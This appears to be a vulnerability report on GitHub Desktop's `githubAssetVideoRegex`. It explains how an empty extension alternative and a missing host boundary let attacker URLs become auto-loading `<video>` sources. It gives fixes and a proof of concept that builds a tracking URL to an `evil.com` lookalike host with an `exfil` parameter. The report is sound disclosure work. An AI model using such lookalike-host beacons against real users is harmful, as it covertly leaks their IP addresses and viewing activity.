## Title
Video-link filter's `githubAssetVideoRegex` accepts non-video, attacker-controlled URLs due to an always-matching extension alternation and a missing host boundary - (File: `app/src/lib/markdown-filters/video-url-regex.ts`)

### Summary
`videoExtensionRegex` in `app/src/lib/markdown-filters/video-url-regex.ts` ends its alternation with an empty branch (`...|mpeg|)$`), so the "must end in a known video extension" check is a no-op — any string satisfies it. Combined with the fact that the CDN-host check in `githubAssetVideoRegex` has no boundary character after the literal host (`user-images.githubusercontent.com`), the overall regex accepts any URL whose textual prefix merely starts with that literal string, including hosts such as `user-images.githubusercontent.com.evil.com`, with any path/extension. [1](#0-0) 

### Finding Description
`githubAssetVideoRegex` is built as:
```
^https://user-images.githubusercontent.com.+(mp4|webm|ogg|mov|qt|avi|wmv|3gp|mpg|mpeg|)$
``` [2](#0-1) 

Two flaws compound:
1. The trailing empty alternative in `videoExtensionRegex` (`.../mpeg|)$`) makes the extension check tautologically true for any string, since `$` can be satisfied by matching the empty alternative right before end-of-string.
2. There is no boundary (`/` or end-of-string) required immediately after the literal CDN host `user-images.githubusercontent.com`, only a `.+` (one-or-more of any character). This means any URL whose string simply *begins with* the literal text `https://user-images.githubusercontent.com` — even as a substring of a longer, attacker-controlled hostname such as `https://user-images.githubusercontent.com.evil.com/x` — satisfies the regex.

This regex is consumed by `VideoLinkFilter.getGithubVideoLink`, which tests an anchor's `href` (derived from attacker-controlled markdown content such as issue/PR bodies, commit messages, or comments rendered in the app) against `githubAssetVideoRegex`, and if it matches, replaces the link with a real `<video>` element whose `src` is set to that attacker-controlled URL. [3](#0-2) [4](#0-3) 

### Impact Explanation
Because the check that is supposed to pin the video source to GitHub's trusted asset CDN is broken in two independent ways, an attacker who can get their markdown rendered in GitHub Desktop (e.g. via a PR/issue/comment body, commit message, or similar attacker-controlled repository content) can cause the renderer to insert a `<video src="https://user-images.githubusercontent.com.attacker.tld/...">` element pointing at an arbitrary, attacker-controlled server. Browsers/Electron `<video>` elements typically issue a network request for metadata (`preload` defaults to `metadata`/`auto`) without any user click, so this causes the victim's GitHub Desktop instance to silently make an outbound HTTP(S) request to the attacker's server, leaking the victim's IP address, User-Agent, and confirmation that a specific piece of attacker-supplied content was rendered/viewed. This is a covert beaconing/tracking primitive against an unprivileged, attacker-controlled input path (repository/API content rendered by the app), matching the "credential/token exfiltration" and content-corruption categories only partially — the concrete demonstrable impact here is IP/user-agent disclosure via unsolicited network requests to an attacker-chosen host, not remote code execution.

### Likelihood Explanation
High. No user interaction beyond viewing the rendered markdown (e.g., opening a PR/issue description or commit inside GitHub Desktop) is required to trigger the video element's preload request. Crafting a matching URL is straightforward since the regex has no anchor requiring the literal host to be followed by `/` or end-of-string, and the extension check is fully bypassed by the empty alternation.

### Recommendation
1. Remove the empty alternative from `videoExtensionRegex` and require a literal dot before the extension, e.g. `/\.(mp4|webm|ogg|mov|qt|avi|wmv|3gp|mpg|mpeg)$/i`.
2. Add a proper boundary after the CDN host so the literal host cannot be a mere string prefix of an attacker's hostname — e.g. require `/` or `:` immediately following the escaped host, or better, parse the URL with the `URL` API and explicitly compare `url.hostname === 'user-images.githubusercontent.com'` rather than relying on regex string-prefix matching. [5](#0-4) 

### Proof of Concept
```js
const { githubAssetVideoRegex } = require('./video-url-regex')

// (1) No extension at all still matches due to empty alternation
console.log(githubAssetVideoRegex.test(
  'https://user-images.githubusercontent.com/1/arbitrary-path'
)) // -> true

// (2) Host boundary bypass: attacker-controlled host that merely starts
// with the expected literal string
console.log(githubAssetVideoRegex.test(
  'https://user-images.githubusercontent.com.evil.com/track?exfil=abc'
)) // -> true
```
When such a link is rendered inside an attacker-controlled markdown body, `VideoLinkFilter.filter` replaces it with `<video src="https://user-images.githubusercontent.com.evil.com/track?exfil=abc">`, causing an unsolicited request to `evil.com` when the DOM renders. [6](#0-5)

import escapeRegExp from 'lodash/escapeRegExp'

const user_images_cdn_url = 'https://user-images.githubusercontent.com'

// List of common video formats obtained from
// https://developer.mozilla.org/en-US/docs/https://developer.mozilla.org/en-US/docs/Web/Media/Formats/Video_codecs/Media/Formats/Video_codecs
// The MP4, WebM, and Ogg formats are supported by HTML standard.
const videoExtensionRegex = /(mp4|webm|ogg|mov|qt|avi|wmv|3gp|mpg|mpeg|)$/

/** Regex for checking if a url is a github asset cdn video url */
export const githubAssetVideoRegex = new RegExp(
  '^' + escapeRegExp(user_images_cdn_url) + '.+' + videoExtensionRegex.source,
  'i'
)
```

  public async filter(node: Node): Promise<ReadonlyArray<Node> | null> {
    const videoSrc = this.getGithubVideoLink(node)
    if (videoSrc === null) {
      return null
    }

    const videoNode = document.createElement('video')
    videoNode.src = videoSrc
    return [videoNode]
  }

  private getGithubVideoLink(node: Node): string | null {
    if (
      isElement(node, 'p') &&
      node.childElementCount === 1 &&
      node.firstChild &&
      isElement(node.firstChild, 'a') &&
      githubAssetVideoRegex.test(node.firstChild.href)
    ) {
      return node.firstChild.href
    }

    return null
  }
